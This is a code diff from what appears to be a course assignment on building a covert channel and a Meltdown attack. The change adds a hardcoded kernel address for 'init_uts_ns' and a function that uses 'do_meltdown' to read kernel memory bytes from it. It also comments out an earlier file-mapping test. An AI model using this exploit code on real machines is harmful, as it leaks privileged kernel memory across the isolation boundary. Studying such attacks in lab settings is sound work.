@@ -6,6 +6,9 @@
 #include <signal.h>
 #include <setjmp.h>
 
+#include "/usr/include/linux/utsname.h"
+
+// for file mapping case 
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <unistd.h>
@@ -13,6 +16,8 @@
 
 #define u64 uint64_t
 #define i64 int64_t
+
+#define cur_init_uts_ns_location 0xffffffffb9df9920
 
 /*
 Task 1 - Build a covert channel (30%)
@@ -161,50 +166,63 @@ static int do_meltdown(uintptr_t adrs) {
     return cc_receive();
 }
 
-#ifdef MELTDOWNCASE
-int main() {
+static void attack_init_uts_ns(){
+    uintptr_t target_adrs = cur_init_uts_ns_location;
+    
     wait(1E9);
     cc_init();
-    const char *filename = "./file";
+    printf("getting char %c\n", do_meltdown(target_adrs));
+    printf("getting char %c\n", do_meltdown(target_adrs));
+    printf("getting char %c\n", do_meltdown(target_adrs+2));
+    printf("getting char %c\n", do_meltdown(target_adrs+2));
+    
+}
+
+#ifdef MELTDOWNCASE
+int main() {
+    attack_init_uts_ns();
+    // wait(1E9);
+    // cc_init();
+    // const char *filename = "./file";
 
     // Open the file
-    int fd = open(filename, O_RDONLY);
-    if (fd == -1) {
-        perror("Error opening file");
-        exit(EXIT_FAILURE);
-    }
+    // int fd = open(filename, O_RDONLY);
+    // if (fd == -1) {
+        // perror("Error opening file");
+        // exit(EXIT_FAILURE);
+    // }
 
     // Get the size of the file
-    struct stat stat_buf;
-    if (fstat(fd, &stat_buf) == -1) {
-        perror("Error getting file size");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+    // struct stat stat_buf;
+    // if (fstat(fd, &stat_buf) == -1) {
+        // perror("Error getting file size");
+        // close(fd);
+        // exit(EXIT_FAILURE);
+    // }
 
     // Map the file into memory
-    void *file_ptr = mmap(NULL, stat_buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-    if (file_ptr == MAP_FAILED) {
-        perror("Error mapping file to memory");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+    // void *file_ptr = mmap(NULL, stat_buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+    // if (file_ptr == MAP_FAILED) {
+        // perror("Error mapping file to memory");
+        // close(fd);
+        // exit(EXIT_FAILURE);
+    // }
  // Print the pointer and content
-    printf("Pointer: %p\n", file_ptr);
-    printf("File Content:\n%s\n", (char *)file_ptr);
+    // printf("Pointer: %p\n", file_ptr);
+    // printf("File Content:\n%s\n", (char *)file_ptr);
     
-    printf("%i\n", do_meltdown((uintptr_t) file_ptr));
+    // printf("%i\n", do_meltdown((uintptr_t) file_ptr));
     
     // Close the file descriptor since it's no longer needed
-    close(fd);
+    // close(fd);
 
    
     // Unmap the file from memory
-    if (munmap(file_ptr, stat_buf.st_size) == -1) {
-        perror("Error unmapping file from memory");
-        exit(EXIT_FAILURE);
-    }
-    printf("%i\n", do_meltdown((uintptr_t) file_ptr));
+    // if (munmap(file_ptr, stat_buf.st_size) == -1) {
+        // perror("Error unmapping file from memory");
+        // exit(EXIT_FAILURE);
+    // }
+    // printf("%i\n", do_meltdown((uintptr_t) file_ptr));
 
     return 0;
 }
